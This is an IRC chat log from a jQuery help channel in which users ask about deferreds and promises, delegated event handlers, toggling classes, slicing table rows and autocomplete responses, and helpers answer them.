[13:37:56] <duch_kazatel> https://bpaste.net/show/5ccc40b8362c Pilotbob
[13:38:02] <duch_kazatel> something like that.
[13:39:05] <Pilotbob> duch_kazatel: thanks... I'll give it a whack.
[13:46:38] <duch_kazatel> Pilotbob does that function you're calling return jquery promises, or native js promises?
[13:49:47] <Pilotbob> I think jQuery... it's kendoUI control which is basically a jquery plugin
[13:49:58] <duch_kazatel> sounds about right then.
[13:50:13] <Pilotbob> yea, seems to be working, but something else is now going on, I'm not sure what.
[13:50:19] <duch_kazatel> hrm?
[13:50:41] <Pilotbob> so, I'm trying to save any pending changes when they hit the "addRow" button (long stort)
[13:50:51] <duch_kazatel> kay
[13:51:06] <Pilotbob> however, after the function exits it seems to rebind the kendoui grid again, I'm not sure why.
[13:51:19] <Pilotbob> so the added row is there for a second, then goes away.
[13:51:57] <Pilotbob> if I return a promise in that function it should still work right. (I mean, I commented it out and that's not the problem.
[13:52:21] <duch_kazatel> should be fine.
[13:52:39] <Pilotbob> Here's the whole bit of code. https://gist.github.com/PilotBob/0c67571f5bdcd13a9172
[13:53:20] <duch_kazatel> return grid.dataSource.sync(); ?
[13:53:44] <duch_kazatel> and what code reinits things or whatever?
[13:54:01] <duch_kazatel> oh and fwiw SaveGridAsync().then(function () { grid.addRow(); }); could become SaveGridAsync().then(grid.addRow);
[13:54:43] <Pilotbob> yea, so I want all the child grids to update, then the parent grid (which is a promies) then in AddRow once that is done I want to call add row,.
[13:55:03] <duch_kazatel> yeah without seeing the whole thing in action.
[13:55:18] <duch_kazatel> no familiarity with kendo
[13:55:43] <Pilotbob> That's all the code in that gist... button calls AddRow.. which calls save async, hopfully returning a promise. maybe it's not.
[13:55:52] <duch_kazatel> might check that.
[13:56:06] <duch_kazatel> and by "in action" i mean "a working fiddle"
[13:56:20] <Pilotbob> yea, I got ya.
[13:57:35] <NitroLiq> Can someone show me how to toggle off a class with a slide toggle. I've part of it here: https://jsfiddle.net/0on75hnr/2/ Just having trouble with the removeClass to remove the background on slide toggle.
[13:57:58] <duch_kazatel> don't use slidetoggle.
[13:58:05] <duch_kazatel> explicitly slideUp/slideDown
[13:58:20] <NitroLiq> why?
[13:58:35] <duch_kazatel> because that'll make it a lot easier to control what you want to do :)
[13:58:47] <NitroLiq> ah, ok
[13:58:57] <duch_kazatel> toggles are usually a bad call.
[13:58:58] * crisumi woo hoo!
[14:36:40] <zumba_addict> hi folks. If let's say we have 3 functions where 2 functions(funcA and funcB) are using $.Deferred and funcC is a regular function. Inside funcA(), we are calling funcB(), am I right that if we are calling funcA from funcC, the funcA has to wait for funcB before funcC will receive the response from funcA?
[14:38:27] <Pilotbob> duch_kazatel: OK, found it. Thanks... promise code works perfectly.
[14:38:37] <NitroLiq> Ok, more issues with that slideUp/slideDown. I've got it working using ternary operators but for some reason failing when converting to a stf if/else statement.
[14:38:46] <NitroLiq> std even
[14:38:48] <NitroLiq> https://jsfiddle.net/0on75hnr/3/
[14:39:09] <NitroLiq> What am I missing?
[14:39:33] <duch_kazatel> zumba_addict do what now?
[14:39:57] <seemikehack> zumba_addict, that is impossible to understand without code. Case in point: what does "using $.Deferred" mean? Are they calling functions that return Deferred? Do they return Deferred?
[14:39:58] <duch_kazatel> NitroLiq if (('.search').css('display') === 'none') {
[14:40:08] <zumba_addict> i mean, if funcC will only get the response once funcA has received the response from funcB
[14:40:12] <duch_kazatel> NitroLiq you're missing something in there :)
[14:40:15] <zumba_addict> k
[14:40:24] <NitroLiq> function?
[14:40:38] <duch_kazatel> NitroLiq ('.search').css is wrong.
[14:40:43] <duch_kazatel> you want $('.search').css
[14:40:45] <Pilotbob> could be checking for display === none? Shouldn't you check visible()? I think jQuery uses colapse for hide at times right?
[14:40:50] <NitroLiq> ah.
[14:41:08] <Pilotbob> and missing a $
[14:41:15] <NitroLiq> Always forget the $
[14:41:20] <NitroLiq> <---slaps head
[14:41:53] <zumba_addict> i forgot the pattern. This is it right? function A() { var deferred = $.Deferred; blash deferred.resolve(thatGoodVar); return deferred; }
[14:42:06] <duch_kazatel> zumba_addict make a bpaste
[14:42:09] <zumba_addict> k
[14:42:10] <duch_kazatel> or a full jsfiddle.
[14:42:31] <duch_kazatel> zumba_addict you keep assuming we know much more than we do about your code.  also, consider the fact that if you don't understand how something works, can you really provide a good explanation about how it does/doesn't work?
[14:43:29] <zumba_addict> duch_kazatel: no, it's not about our code. I just wanted to know more about how deferred works - http://pastebin.com/pP24bvXK
[14:43:40] <zumba_addict> it's an example that I was thinking
[14:43:44] <NitroLiq> It feels weird to me that css('display', 'none') wouldn't check for equality
[14:43:57] <duch_kazatel> NitroLiq how would you set it then?>
[14:44:00] <zumba_addict> but for that code, I wanted to know if the deferred code is right
[14:44:05] <duch_kazatel> zumba_addict that code seems relatively useless.
[14:44:16] <NitroLiq> I just mean when checking
[14:44:20] <duch_kazatel> you have a function that returns an immediately resolved deferred.
[14:44:31] <duch_kazatel> NitroLiq right - how would you then set the value?
[14:44:50] <seemikehack> zumba_addict, Maybe start here: http://www.html5rocks.com/en/tutorials/es6/promises/
[14:45:03] <NitroLiq> in the css
[14:45:05] <zumba_addict> duch_kazatel: yes, I'm aware but would like to know if the return code is correct. I remember someone told me to put () at the end like return deferred();
[14:45:07] <duch_kazatel> seemikehack jquery promises/deferreds are not currently spec compliant.
[14:45:11] <zumba_addict> that's where I am confused
[14:45:29] <seemikehack> zumba_addict, for what you understand right now, $.Deferred and ES6 Promises are close enough.
[14:45:38] <zumba_addict> k
[14:45:38] <duch_kazatel> eeeeh, not really, but okay.
[14:45:41] <seemikehack> duch_kazatel, I know, but he seems to lack a basic understanding of promises.
[14:45:43] <duch_kazatel> zumba_addict returning the deferred like that "works".
[14:45:51] <zumba_addict> k
[14:45:54] <duch_kazatel> seemikehack that's why you point them at the jquery version of the,.
[14:45:54] <Pilotbob> NitroLiq: sholdn't you use .is(':visible')  ?
[14:46:25] <duch_kazatel> https://learn.jquery.com/code-organization/deferreds/
[14:46:26] <seemikehack> duch_kazatel, I haven't seen a jQuery overview that's as good as the HTML5Rocks one, but then, I haven't looked.
[14:46:44] <seemikehack> Hey, how 'bout that? :)
[14:46:54] <NitroLiq> Pilotbob many ways to skin a cat I suppose. I've never used that.
[14:46:55] <duch_kazatel> until jquery promises are spec compliant, i wouldn't point users to explanations for native ones.
[14:47:31] <Pilotbob> NitroLiq: yea, I use hide(), show() and is(':visible')
[14:47:43] <seemikehack> duch_kazatel, fair enough.
[14:48:49] <duch_kazatel> Pilotbob 50000 ways to check for visibility.  in this case, i'd check for the existence of the class they were adding/removing.
[14:49:32] <shoky_> zumba_addict: it's  $.Deferred() to create a deferred.  and for the return maybe you meant this:   return deferred.promise();
[14:49:37] <Pilotbob> duch_kazatel: didn't know he was adding the class... but yes, 50000 ways is probably an underestimate. lol
[14:49:44] <AbuDhar> guys can I make a media query in jQuery?
[14:49:47] <zumba_addict> thanks shoky
[14:50:08] <Pilotbob> AbuDhar: why would you do that?
[14:51:28] <Pilotbob> AbuDhar: use jquery to modify the dom, not syle it. Add or remove a class that is defined in your css with media queries.
[14:51:49] <duch_kazatel> err.
[14:51:55] <duch_kazatel> just use media queries in your css in that case.
[14:52:12] <duch_kazatel> the adding/removing of the class becomes entirely irrelevant at that point :)
[14:52:42] <AbuDhar> Pilotbob: I need to swap out a class based on a width :)
[14:52:47] <zumba_addict> this is what I'm planning to implemnent shoky_ duch_kazatel http://pastebin.com/upGAV5pE
[14:52:55] <Pilotbob> duch_kazatel: right, isn't that what I said.
[14:52:55] <duch_kazatel> AbuDhar does that class change styles?
[14:53:03] <AbuDhar> nope
[14:53:04] <duch_kazatel> Pilotbob you said to add or remove a class.
[14:53:14] <duch_kazatel> AbuDhar then what does the class do?
[14:53:21] <AbuDhar> grid_3 to grid_2
[14:53:22] <AbuDhar> that's all :)
[14:53:29] <duch_kazatel> is this for bootstrap?
[14:53:32] <AbuDhar> nope
[14:53:41] <duch_kazatel> you can bind a resize handler.
[14:53:43] <zumba_addict> the reason why I want to do that is because if I am debugging it, the value gets pasted in console correctly. However, once I disable debugging, the values are gone 100%
[14:53:43] <duch_kazatel> but that's kind of funky.
[14:53:51] <Pilotbob> duch_kazatel: right... general advice, don't use jquery for style/layout.
[14:53:58] <Pilotbob> of course, there are always exceptions.
[14:54:03] <AbuDhar> it's not for styling heh :)
[14:54:08] <AbuDhar> otherwise I would just have used css
[14:54:11] <duch_kazatel> AbuDhar what's it for then?
[14:54:15] <duch_kazatel> behavior?
[14:54:25] <duch_kazatel> because i'd just check viewport width at that point.
[14:54:27] <AbuDhar> what I said.. just to swap out a class from grid_3 to grid_2 based on this width:
[14:54:34] <AbuDhar> 360
[14:54:36] <AbuDhar> px
[14:54:46] <duch_kazatel> i'm suggesting a much simpler way to do what you want.
[14:54:57] <duch_kazatel> if you have an event handler or something similar, just check the viewport width then,.
[14:55:12] <zumba_addict> brb, don't want to miss the train
[14:55:13] <AbuDhar> yeah you have a tutorial on how to do that?
[14:55:23] <AbuDhar> or a fiddle?
[14:55:29] <Pilotbob> shouldn't you be using the same class, no matter the width? and have media queries style the class for each width?
[14:55:49] <AbuDhar> but does it make sense to style grid_3 something other than 33%?
[14:55:57] <AbuDhar> I have done that other places so I could just do it again
[14:56:02] <AbuDhar> just wanted to try the jquery way
[14:56:09] <duch_kazatel> if ($(window).width() > 360) {}
[14:56:17] <duch_kazatel> in your handler.
[14:56:21] <duch_kazatel> instead of adding/removing classes./
[14:56:58] <AbuDhar> so I should not remove and add class?
[14:57:25] <duch_kazatel> correct.
[14:57:29] <duch_kazatel> that is something you should avoid.
[14:57:39] <AbuDhar> I will just resize the grid_3 then :)
[14:57:42] <AbuDhar> not a problem
[14:57:49] <duch_kazatel> wait what?
[14:57:59] <duch_kazatel> then you need media queries in your css.
[14:58:02] <AbuDhar> I will just change the width of grid_3
[14:58:04] <AbuDhar> yeah I do have them
[14:58:11] <duch_kazatel> that's what you need here in your css.
[14:58:16] <AbuDhar> I have a lot of breakpoints.
[14:58:47] <duch_kazatel> that's fine - your css is a much better place to handle this kind of work.  window resize handlers are sloooooooowwww
[14:58:55] <AbuDhar> hehe good!
[14:58:56] <AbuDhar> thanks
[15:00:33] <AbuDhar> thanks a lot for clearing that up duch_kazatel
[15:00:47] <AbuDhar> so I didn't have to waste my time doing the other thing
[15:03:37] <AbuDhar> is jquery more powerful than JS in your view?
[15:03:42] <AbuDhar> than pure JS*
[15:03:43] <duch_kazatel> "powerful" how?
[15:03:50] <AbuDhar> is it faster or slower?
[15:03:55] <duch_kazatel> both.
[15:04:13] <AbuDhar> I mean not to write the code but to execute it
[15:04:13] <duch_kazatel> faster dev time, sometimes faster performing code.  wrong way to approach the question ;)
[15:04:17] <amikrop> When I try to use .live() I get "live is not a function" I use 2.1.4
[15:04:25] <duch_kazatel> amikrop you want .on()
[15:04:47] <amikrop> duch_kazatel: .on() doesn't seem to catch the event for elements created in the future
[15:04:58] <duch_kazatel> amikrop you need to use the delegated syntax instead.
[15:05:10] <duch_kazatel> http://api.jquery.com/on/#direct-and-delegated-events for the pertinent info.
[15:05:30] <amikrop> duch_kazatel: thanks
[15:05:45] <AbuDhar> is off-topic talk allowed in this channel?
[15:05:50] <duch_kazatel> to an extent.
[15:06:14] <AbuDhar> https://www.youtube.com/watch?v=d_1s-e1wn6k check this cake ... wouldn't you want that? :D
[15:06:35] <duch_kazatel> that's... far enough OT to not be Okay lol
[15:06:47] <duch_kazatel> we try to keep things generally development related .
[15:10:03] <amikrop> delegation syntax didn't work either, I did $('p .myclass').on('blur', function () {...});
[15:10:10] <duch_kazatel> that's delegated.
[15:10:19] <duch_kazatel> *not delegated.
[15:10:22] <duch_kazatel> you didn't read the full description :)
[15:10:38] <duch_kazatel> $('p).on('blur', '.myclass', function () {...});
[15:10:51] <duch_kazatel> err, $('p').on('blur', '.myclass', function () {...});
[15:10:53] <amikrop> oh right, thanks
[15:10:59] <duch_kazatel> assuming $('p') exists on pageload and never changes.
[15:15:44] <amikrop> Is there any way I can make a blinking cursor appear in some text?
[15:15:51] <amikrop> on some text*
[15:15:55] <duch_kazatel> use a text input field?
[15:16:12] <amikrop> on a non text input field
[15:16:16] <amikrop> on normal content
[15:16:34] <duch_kazatel> why would you need a cursor in non-input text?  that'd be kind of confusing to end users.
[15:16:50] <amikrop> duch_kazatel: not if its only during hover
[15:16:58] <duch_kazatel> huh?
[15:17:01] <amikrop> I will turn in text input field when they click
[15:17:02] <duch_kazatel> so can they edit the text or not?
[15:17:08] <amikrop> only if they click on it
[15:17:21] <duch_kazatel> then show the cursor when they click.  otherwise, add in a span with a pipe that you flash.
[15:17:59] <amikrop> I want the user to know the text is editable (if they click on it)
[15:18:02] <amikrop> oh ok I see, manually then
[15:18:04] <amikrop> thanks
[15:18:15] <duch_kazatel> then use some other UI element to illustrate that.
[15:18:34] <AbuDhar> oh sorry duch_kazatel
[15:29:46] <cangelosx> Hey. New to IRC, new to Jquery. Can I get some help?
[15:29:55] <duch_kazatel> just ask your question.
[15:30:00] <duch_kazatel> if somebody can help, they will :)
[15:30:33] <cangelosx> Okay, sweet. How do I reference an element inside a function call (say, attr())?
[15:30:43] <duch_kazatel> is it an event handler?
[15:30:55] <duch_kazatel> (need more details)
[15:31:12] <duch_kazatel> http://jsfiddle.net/ is a good place to create a self-contained demo if that's easier.
[15:31:16] <cangelosx> For example, I'm trying to set the 'class-data' of attr every element of .foo to its attr of 'class'
[15:31:46] <cangelosx> $(".foo").attr('data-class', $(this).attr('class'))
[15:31:48] <duch_kazatel> yeah, make a quick fiddle - i'm not understanding your problem :)
[15:31:56] <cangelosx> sorry, I meant data-class not class-data.
[15:31:56] <duch_kazatel> oh, you need .each() in that case.
[15:32:05] <duch_kazatel> and use .data() for that, not .attr()
[15:32:11] <duch_kazatel> .data('class')
[15:32:49] <cangelosx> so $('.foo').each(function(){$(this).data('class', $(this).attr('class'))});
[15:32:53] <cangelosx> something like that?
[15:33:05] <duch_kazatel> yep.  thoguh why are you doing that?
[15:33:09] <duch_kazatel> seems awfully strange.
[15:33:25] <jababa> I'm running into an issue with an input type='number'
[15:33:26] <jababa> http://jsbin.com/togegokihi/edit?html,js,output
[15:33:47] <cangelosx> I have a page where I want buttons with icons to spin (fa fa-spin) while ajax is loading.
[15:33:54] <jababa> I'm trying to set the value to 012345 but it gets set as 5349
[15:33:57] <duch_kazatel> jababa .val() takes a strinng.
[15:33:59] <duch_kazatel> not a number.,
[15:34:13] <duch_kazatel> cangelosx then add a class that causes the spin.,
[15:34:24] <duch_kazatel> don't move the old class somewhere else.
[15:34:29] <duch_kazatel> allow the css to override things.
[15:34:41] <jababa> @duch_kazatel it says string, number, or array
[15:34:42] <jababa> http://api.jquery.com/val/#val-value
[15:34:48] <zumba_addict> hi duch_kazatel: did you see my pastebin earlier?
[15:34:48] <cangelosx> the problem is that I need to change the icon to a spin friendly icon (like fa-refresh) while spinning then back to the original icon
[15:34:52] <duch_kazatel> jababa using a string worked fine for me jababa
[15:35:10] <cangelosx> I figure the cleanest way to remember what the original icon is to save the class in data-class
[15:35:10] <duch_kazatel> cangelosx you can just .addClass() and .removeClass() in those cases.
[15:35:20] <cangelosx> which class, though?
[15:35:22] <duch_kazatel> explicitly add or remove the classes you want, cangelosx
[15:35:40] <jababa> thanks, duch_kazatel.  Documentation says it takes a String, Number, or Array
[15:35:47] <duch_kazatel> jababa sure, i see that.
[15:35:52] <duch_kazatel> but it works with a string.
[15:35:56] <duch_kazatel> maybe report the bug?
[15:36:00] <cangelosx> let's say I have <i class="fa fa-search"> and I want to change it to fa fa-refresh fa-spin only when it's spinning
[15:36:25] <duch_kazatel> sounds like you really want to hide/show different icons instead.
[15:36:27] <duch_kazatel> zumba_addict nope.,
[15:36:29] <cangelosx> when adding those classes (fa fa-refresh fa-spin) it won't change the icon itself
[15:36:37] <zumba_addict> oh, let me find it :)
[15:36:47] <duch_kazatel> zumba_addict i'm jnot the only person who can help you.
[15:36:55] <duch_kazatel> fwiw.
[15:36:57] <zumba_addict> yup, will do
[15:37:15] <cangelosx> I don't want to show/hide items because that would require modifying the original html
[15:37:26] <duch_kazatel> how many of these icons are therE?
[15:37:49] <cangelosx> it's not so much about how many icons, but how many elements (submit buttons, etc) contain these icons
[15:38:45] <zumba_addict> so folks, the reason I wanted to do this kind of approach is because I noticed that the render is not showing any data. However, if I am debugging it in developer tools, the data is being displayed. The object is populated correctly inside a function and that object is used on another function. I'm planning to convert those functions to use $.Deferred - http://pastebin.com/upGAV5pE
[15:39:03] <duch_kazatel> wat
[15:39:23] <cangelosx> I'm trying to create behavior where a submit button stops submitting on click (type="button" instead of "submit") and has its icon spinning (fa-refresh fa-spin) while ajax is loading
[15:39:36] <zumba_addict> i'm not sure how to explain it but that's very clear I think
[15:40:02] <cangelosx> it's working great so far, I just need to copy the icon's class into its own data-class so i can set it back later
[15:40:08] <cangelosx> make sense zumba_addict?
[15:40:25] <zumba_addict> what cangelosx?
[15:40:36] <duch_kazatel> cangelosx that seems funky to me, but you'd use an .each() in thate case.
[15:40:37] <duch_kazatel> *that
[15:40:52] <cangelosx> sorry, zumba_addict, mis-tab
[15:40:58] <zumba_addict> oh ok
[15:41:08] <cangelosx> duch_kazatel: How would you do it?
[15:41:19] <duch_kazatel> cangelosx i'd need to see an example of the ui.
[15:43:59] <cangelosx> duch_kazatel: I've never used JSfiddle before. Where would I put the bootstrap/jquery css/js tags?
[15:44:08] <cangelosx> duch_kazatel: to include the libraries, I mean.
[15:44:15] <Woet> cangelosx: on the left.
[15:44:24] <Woet> cangelosx: external resources (if it's not featured)
[15:45:12] <cangelosx> Woet: I see it now, it gives me options for jquery. How would I throw bootstrap in there?
[15:45:18] <cangelosx> oops.
[15:45:28] <cangelosx> sorry, didn't read that.
[15:46:30] <Whiskey> This code is not correct but http://jsfiddle.net/Slaktarn/t3up99bj/3/ is it possible to hide DataViewBox by find something inside it like this case the class on the table?
[15:46:42] <Whiskey> Look it on something so you know you are hide the right element?
[15:47:04] <cangelosx> duch_kazatel: I'm working on a fiddle. do data- attributes have to have a value?
[15:48:37] <duch_kazatel> they should.
[15:49:28] <Whiskey> $(".dataViewBox").find("Table.SFV").css("display", "none") like that but the oppsite way hide DataViewBox insted of Table.SFV
[15:51:09] <cangelosx> duch_kazatel: http://jsfiddle.net/y40pvg6a/
[15:51:43] <cangelosx> duch_kazatel: these buttons don't have IDs as there can be more than one
[15:51:50] <Whiskey> cangelosx: nice botton :D
[15:52:04] <duch_kazatel> so you click a button - what shoul dhappen?
[15:52:38] <cangelosx> duch_kazatel: submit the form. but that's not what I'm interested in. I want the icon to change to fa-refresh and spinning while ajax is loading
[15:53:12] <duch_kazatel> but you said multiple buttons would be impacted by this - are they all save buttons?
[15:53:21] <duch_kazatel> because you could store the class in a data attribute if you want.
[15:53:25] <Whiskey> hmm strange, don´t find anything to do oppsoite
[15:53:30] <duch_kazatel> just seems unusual.
[15:53:30] <cangelosx> duch_kazatel: any button that has data-ajax-spinner attribute
[15:54:06] <duch_kazatel> yeah, i guess the .each() is where you want to be, but i feel like an ajax loading overlay of some kind would be more useful.
[15:54:11] <cangelosx> duch_kazatel: because there's no unique indentifier to the buttons, I need a way for an icon it save its own original state. make sense?
[15:54:34] <cangelosx> duch_kazatel: I have ajaxStart call the function that tells the buttons to spin.
[15:55:12] <dchinjao> I want to give a <input> as much width (literally, visualy) as another element currently has. How can I do it? Its some division by the font-size of the text of the said element?
[15:55:13] <cangelosx> duch_kazatel: it's actually working nicely now with the each() solution. I'm just curious how you would implement it.
[15:55:32] <Whiskey> cangelosx: any tips?
[15:55:48] <cangelosx> duch_kazatel: the problem doing it otherwise is that you don't know which icon the button used to have. The button could have any icon before spinning.
[15:56:04] <cangelosx> Whiskey: tips on what, sorry?
[15:56:08] <duch_kazatel> i tend to be much more explicit since i wouldn't update all or none.
[15:56:24] <Whiskey> cangelosx: $(".dataViewBox").find("Table.SFV").css("display", "none") like that but the oppsite way hide DataViewBox insted of Table.SFV
[15:56:42] <Whiskey> Hide an element if another element inside it is found
[15:57:00] <dchinjao> like  $('#myinput).css('width' $(someelmnt).text().length / 1.3);  ? (1.3em is the size of someelmnt)
[15:57:57] <cangelosx> Whiskey: I'm now to jquery but the easiest I can think of is $(".dataViewBox").find("Table.SFV").parents(".dataViewBox").hide()
[15:58:00] <cangelosx> new*
[15:58:21] <Whiskey> awsome :)
[15:58:26] <Whiskey> thanks
[15:58:29] <cangelosx> did it work?
[15:58:32] <Whiskey> yes
[15:58:36] <Whiskey> like a charm :)
[15:58:56] <cangelosx> use element.hide() instead of element.css()
[15:59:01] <duch_kazatel> one-liners D:
[15:59:14] <Whiskey> cangelosx: why?
[15:59:22] <Whiskey> I have use CSS all the time works perfect
[15:59:40] <duch_kazatel> best would be to use addClass() or removeClass() and let your css decide how to handle styling ;)
[15:59:53] <cangelosx> Whiskey: because css would reset all of the element's other classes
[16:00:09] <Whiskey> never notice that
[16:00:09] <cangelosx> Whiskey: or what duch_kazatel said
[16:00:26] <cangelosx> I'm new to jquery and javascript in general myself
[16:00:49] <duch_kazatel> what?
[16:00:56] <duch_kazatel> "because css would reset all of the element's other classes"
[16:00:58] <duch_kazatel> that's... not sure.
[16:01:23] <duch_kazatel> .css() overrides that specific property regardless of what any other rule says.
[16:01:30] <cangelosx> ohh.
[16:01:47] <cangelosx> I kinda speculated that css() was like setting an element's style attribute
[16:01:54] <duch_kazatel> nope.
[16:02:06] <duch_kazatel> but even if it was, the style attribute doesn't override other rules.
[16:02:26] <cangelosx> I guess not. I mixed that up with the class attribute.
[16:02:39] <duch_kazatel> errr, wait.  i may have that backwards.
[16:02:40] <cangelosx> I didn't mean override, but rather reset.
[16:02:47] <duch_kazatel> nope, no reset either.
[16:03:18] <duch_kazatel> .css() and style attributes only impact the rules you specify
[16:03:19] <cangelosx> as in <div class="foo bar baz"> and instead of addClass you set the class, it resets all classes
[16:03:24] <cangelosx> duch_kazatel: I understand
[16:03:34] <cangelosx> duch_kazatel: I just somehow mixed up css with the class attribute
[16:03:46] <Whiskey> Whit other words im fine
[16:03:59] <cangelosx> duch_kazatel: anyway, back to the original topic, how would you implement the behavior I was describing?
[16:04:16] <duch_kazatel> without seeing a more fleshed out example, I guess exactly the way you would?
[16:04:47] <cangelosx> duch_kazatel: the reason it can't be specific to an ID is that I need to disable all elements that would submit a form while ajax is loading
[16:05:06] <duch_kazatel> that seems funky to me.
[16:05:16] <duch_kazatel> i tend to think in a much more "widgetized" manner.
[16:05:48] <duch_kazatel> so i'd have three forms that all maintain state in their own special ways.
[16:05:56] <Whiskey> Another question
[16:06:08] <duch_kazatel> pass around context and stuff to manage those distinctions instead.
[16:06:39] <Whiskey> $("table.FileInfo tr").slice(-4).remove() <--- will remove the 4 last tr in the table, if i change it to + it will remove every tr in table but not the first 4. How do i remove every tr in table but not the last 4?
[16:06:44] <cangelosx> duch_kazatel: Let's say you have a form that has an ajax call that actually modifies one of the form inputs. This ajax call is fired when you change one of the inputs. How would you have the form wait on the new input value before submitting?
[16:07:03] <cangelosx> duch_kazatel: being new to this, I figure I'll stop a form submit button from submitting until ajax is done.
[16:07:07] <duch_kazatel> cangelosx i do really poorly with text descriptions - that's why i keep pushing for a fiddle.
[16:07:15] <duch_kazatel> Whiskey check the docs for .slice
[16:07:21] <duch_kazatel> and check out .length
[16:07:32] <duch_kazatel> Whiskey if you're still stuck, make a fiddle.
[16:07:47] <Whiskey> well its not mutch to fiddle
[16:07:54] <duch_kazatel> ... doesn't matter?
[16:08:00] <duch_kazatel> a working example is great.
[16:08:10] <Whiskey> + - won´t do it
[16:08:14] <duch_kazatel> nope.
[16:08:22] <duch_kazatel> takes more than that.
[16:08:31] <Whiskey> what about last + 4
[16:08:39] <duch_kazatel> make a fiddle ;)
[16:08:45] <shoky_> why even talk about the fiddle and not go do the first thing duch suggested
[16:08:54] <duch_kazatel> ^
[16:09:03] <duch_kazatel> trying to help teach you to fish mang.
[16:09:09] <shoky_> no need for .length btw
[16:09:26] <duch_kazatel> depending on how you want to do it.
[16:09:46] <shoky_> well, i mean for what he asked, removing all but the last 4

[16:11:13] <duch_kazatel> woah wtf.
[16:11:16] <Whiskey> duch_kazatel: remember that the content in table can change, so the rows are not a specefic number
[16:11:32] <duch_kazatel> sure, hence "last 4"
[16:12:14] <Whiskey> ?
[16:12:49] <Whiskey> aha
[16:13:13] <Whiskey> maybe not
[16:14:25] <shoky_> why .slice(70
[16:14:30] <shoky_> .slice(7)
[16:14:31] <duch_kazatel> lol
[16:14:47] <Whiskey> $("table.SFV tr").slice(0, -4).remove() :)
[16:14:53] <shoky_> bingorama
[16:15:00] <duch_kazatel> yaaaay
[16:23:07] <cangelosx> How I select elements with multiple attributes? (type='foo', name='bar')
[16:25:56] <duch_kazatel> don't use attribute selectors.
[16:26:01] <duch_kazatel> start with a class and filter if you can.
[16:26:34] <cangelosx> duch_kazatel: even if the desired behavior is not style-related?
[16:26:46] <duch_kazatel> even then.  attribute selectors are slow.
[16:26:54] <duch_kazatel> classes/ids/elements are for selecting.
[16:26:59] <duch_kazatel> attributes are for data.
[16:27:45] <cangelosx> duch_kazatel: <button type="submit" data-submit-wait-ajax></button> vs <button type="submit" class="data-submit-wait-ajax"></button>
[16:27:54] <duch_kazatel> errr.
[16:27:57] <duch_kazatel> neither.
[16:28:01] <duch_kazatel> or use .filter()
[16:28:24] <cangelosx> duch_kazatel: how would you have a button identify that it needs to follow specific not not unique behavior?
[16:28:32] <cangelosx> but not*
[16:28:53] <duch_kazatel> if it's a callback for an async operation, pass context into my .done()
[16:29:33] <duch_kazatel> var $someElement = $(this).find('.someElement'); $.ajax().done(function(data) {$someElement.removeClass()})
[16:29:36] <duch_kazatel> or whatever
[17:01:43] <YamakasY> I have some javascript with does not conflict but in some way the unused js scrolls my page down because of some init or so which it sees... what is best, exclude that whole JS file as I don't need it on my other $_GET states ?
[17:11:09] <duch_kazatel> "unused js" is suspect.
[17:11:14] <duch_kazatel> what happens?
[17:24:31] <amikrop> Seems like $.post doesn't take a settings object as the docs say: http://dpaste.com/0GYTXDB
[17:24:57] <amikrop> This gives me 404 foo/[Object object] deos not exist
[17:25:14] <amikrop> $.post tries to use the whole first argument as the url
[17:25:25] <amikrop> but the docs say it can take a settings object
[17:26:58] <duch_kazatel> look at the version added.
[17:26:59] <duch_kazatel> :)
[17:27:30] <amikrop> version added?
[17:27:39] <amikrop> oooh :)
[17:27:40] <amikrop> ok
[18:57:03] <morph1> with this Jquery here: $(‘input’).keypress(function (e) { if (e.which == 90) alert (‘Z was typed.’) }); why does a parameter (e) need to be passed to the function to detect keyboard events?
[19:10:42] <nodist> what is e?
[19:11:04] * nodist a statement not a question
[19:11:14] <nodist> !mdn
[19:11:58] <nodist> e: https://developer.mozilla.org/en-US/docs/Web/Guide/Events/Overview_of_Events_and_Handlers
[19:45:19] <pokergod> I want to be able to drag my columns of my table in different order, and have them persist.
[19:59:24] <mampam> hi all

[22:29:28] <nodist> yeah im back
[22:30:03] <mampam> ok
[22:30:18] <mampam> i have a js file i am using for autocomplete
[22:30:40] <mampam> it returns json but it is not showing up on my input box
[22:30:54] <mampam> i see it in the browser console though
[22:31:03] <mampam> under network
[22:31:17] <mampam> its returning an xhr
[22:31:24] <nodist> do you have a paste
[22:32:01] <mampam> {     "carNames": {         "12": "Ferrari",         "13": "Ford"     } }
[22:32:06] <mampam> that is the response
[22:32:23] <mampam> based on what i typed in the input box
[22:32:51] <nodist> I mean of the code
[22:33:07] <mampam> oh ok
[22:33:09] <mampam> $(document).ready(     function($) {     $('#autocomplete').autocomplete({         source: "cars/index.json"     }); });
[22:33:16] <mampam> that is the content of my js file
[22:33:21] <mampam> index.js
[22:33:34] <mampam> its being used in a cakephp project
[22:35:10] <nodist> https://jqueryui.com/autocomplete/
[22:35:49] <nodist> your going to have to modify your json object before putting it in the autocomplete
[22:39:56] <mampam> OK
[22:40:22] <mampam> how do you mean?
[22:40:31] <mampam> change the way it looks?
[22:40:41] <mampam> so is it in a bad format now?
[22:47:24] <pokergod> i'm using dragtable with dynamic data.  The column headers reorder properly, however the data does not.  Any ideas?
[22:54:30] <coldhead> you must not be doing it right
[23:13:00] <tuskkk___> I have a functions.js with all the common function, when I call it from one of my files, I am getting, TypeError: $.fn.methodName is not a function
[23:13:13] <tuskkk___> how to get around that?
[23:13:54] <Uhkis> put functions.js last of your scripts and use document.ready
[23:14:24] <Uhkis> and make sure jquery is the first loaded script
[23:19:09] <tuskkk___> ok
[23:20:44] <tuskkk___> now I just kept two scripts, first one is jquery and second is functions.js, still the same thing, the method is called in document ready too
[23:24:01] <hellyeah> hey anyone here
[23:25:06] <Uhkis> tuskkk___: then you need to show code
[23:25:43] <hellyeah> eheh
[23:25:44] <hellyeah> :D
[23:26:26] <hellyeah> why localstorage didnt work here when you click the image button on the table i stored the value of id in setItem? http://jsfiddle.net/av9hfb9L/51/
